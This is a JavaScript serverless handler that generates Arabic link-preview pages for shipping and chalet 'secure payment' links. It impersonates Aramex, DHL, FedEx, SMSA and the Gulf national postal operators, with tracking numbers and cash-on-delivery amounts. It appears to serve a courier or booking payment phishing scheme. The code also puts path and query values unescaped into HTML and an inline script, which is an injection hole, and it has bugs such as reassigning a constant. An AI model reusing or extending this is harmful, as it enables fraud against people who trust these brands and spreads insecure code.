// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  }
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

exports.handler = async (event, context) => {
  const { path, queryStringParameters } = event;
  
  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
  let countryCode, type, id;
  
  if (pathMatch) {
    [, countryCode, type, id] = pathMatch;
  } else {
    // Handle payment page routes: /pay/:id/...
    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
    if (pathMatch) {
      [, id, subPath] = pathMatch;
      // For payment pages, we need to determine the type from the link data
      type = 'shipping'; // Default to shipping for payment pages
      countryCode = 'SA'; // Default country, will be overridden by link data
    } else {
      return {
        statusCode: 404,
        body: 'Not Found'
      };
    }
  }
  
  const country = countryData[countryCode];
  
  if (!country) {
    return {
      statusCode: 404,
      body: 'Country not found'
    };
  }
  
  // No external API calls – rely on client-provided context only
  const linkData = null;
  
  // For payment pages, get country and type from link data if available
  if (linkData?.country_code) {
    countryCode = linkData.country_code;
    const linkCountry = countryData[countryCode];
    if (linkCountry) {
      country = linkCountry;
    }
  }
  
  if (linkData?.type) {
    type = linkData.type;
  }
  
  // Debug logging
  console.log('Link ID:', id);
  console.log('Link Data:', linkData);
  console.log('Query Parameters:', queryStringParameters);
  console.log('Final Country:', countryCode, 'Type:', type);
  
  let title = "";
  let description = "";
  let ogImage = "/og-aramex.jpg";
  let serviceKey = 'aramex'; // fallback
  
  if (type === "shipping") {
    // Determine service key from multiple sources
    if (linkData?.payload?.service_key) {
      serviceKey = linkData.payload.service_key;
      console.log('Using service_key from payload:', serviceKey);
    } else if (linkData?.payload?.service) {
      serviceKey = linkData.payload.service;
      console.log('Using service from payload:', serviceKey);
    } else if (queryStringParameters?.service) {
      serviceKey = queryStringParameters.service;
      console.log('Using service from query params:', serviceKey);
    } else {
      console.log('Using fallback service:', serviceKey);
    }
    
    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
    
    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
    
    // Determine if this is a payment page or microsite
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
    
    title = `${pageType} - ${serviceName}`;
    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
    ogImage = serviceInfo.ogImage;
    
    // Add tracking number to description if available
    if (linkData?.payload?.tracking_number) {
      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
    }
    
    // Add COD amount if available
    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
    }
  } else if (type === "chalet") {
    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
    
    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
    
    // Add guest count and nights if available
    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
    }
    
    ogImage = "/og-aramex.jpg"; // Default for chalets
  }
  
  const siteUrl = `https://${event.headers.host}`;
  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
  
  // Final debug logging
  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
  
  // Generate HTML with proper meta tags
  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#0EA5E9" />
  
  <!-- Basic Meta Tags -->
  <title>${title}</title>
  <meta name="description" content="${description}" />
  <meta name="author" content="منصة الشحن الذكية" />
  
  <!-- Open Graph / Facebook / WhatsApp -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${fullUrl}" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${fullOgImage}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:site_name" content="نظام الدفع الآمن" />
  <meta property="og:locale" content="ar_AR" />
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="${fullUrl}" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${fullOgImage}" />
  <meta name="twitter:image:alt" content="${title}" />
  
  <!-- Additional SEO -->
  <meta name="robots" content="index, follow" />
  <meta name="language" content="Arabic" />
  <link rel="canonical" href="${fullUrl}" />
  
  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
  
  <style>
    body {
      font-family: 'Almarai', sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #0EA5E9, #06B6D4);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .loading {
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .meta-info {
      background: rgba(255, 255, 255, 0.1);
      padding: 20px;
      border-radius: 10px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="meta-info">
      <h1 style="font-size: 2rem; margin-bottom: 1rem;">${title}</h1>
      <p style="font-size: 1.2rem; margin-bottom: 1rem;">${description}</p>
      <p style="font-size: 0.9rem; opacity: 0.8;">جاري التحميل...</p>
    </div>
  </div>
  
  <script>
    // Redirect to actual app after a short delay
    setTimeout(() => {
      // For payment pages, redirect to the actual React app
      if ('${path}'.startsWith('/pay/')) {
        window.location.href = '${fullUrl}';
      } else {
        // For microsite pages, redirect to the actual React app
        window.location.href = '${fullUrl}';
      }
    }, 2000);
  </script>
</body>
</html>`;

  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
      'X-Robots-Tag': 'noindex, nofollow'
    },
    body: html
  };
};